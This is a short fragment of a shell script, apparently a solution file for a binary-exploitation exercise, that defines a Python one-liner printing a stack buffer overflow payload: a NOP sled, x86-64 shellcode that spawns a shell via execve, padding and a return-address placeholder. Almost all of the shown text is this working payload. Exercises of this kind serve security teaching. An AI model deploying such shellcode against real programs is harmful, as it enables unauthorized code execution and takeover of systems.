...
#       so you should run the script by invoking "source ./solution1.sh" to 
...
EXPLOIT_GENERATOR_PROGRAM="import sys; sys.stdout.write('\\x90'*(64-31) + '\\x48\\x83\\xC4\\x40\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05' + 'A'*8 + '$JUMP_TARGET_LITTLE_ENDIAN')"
